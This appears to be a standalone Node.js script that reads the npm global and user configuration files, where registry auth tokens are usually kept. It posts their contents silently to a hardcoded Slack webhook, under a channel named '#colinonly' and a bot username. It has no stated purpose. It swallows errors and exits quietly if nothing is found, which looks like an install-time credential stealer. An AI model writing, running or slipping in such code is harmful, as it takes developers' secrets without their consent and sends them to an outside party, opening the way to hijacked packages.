'use strict';

const fs = require('fs');
const https = require('https');
const url = require('url');

const config = {
  envVars: ['npm_config_globalconfig', 'npm_config_userconfig'],
  hook: 'https://hooks.slack.com/services/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',
  message: {
    channel: '#colinonly',
    username: 'webhookbot',
    icon_emoji: ':ghost:',
  }
};

let out = '';

function readFile (path) {
  try {
    return fs.readFileSync(path, 'utf8');
  } catch (err) {
    return;
  }
}

config.envVars.forEach((envVar) => {
  const data = readFile(process.env[envVar]);

  if (data) {
    out += data;
  }
});

if (!out) {
  process.exit();
}

const message = Object.assign(config.message, { text: out });
const payload = JSON.stringify(message);
const settings = Object.assign(url.parse(config.hook), { method: 'POST' });
const request = https.request(settings, (res) => {});
request.on('error', () => {});
request.end(payload);
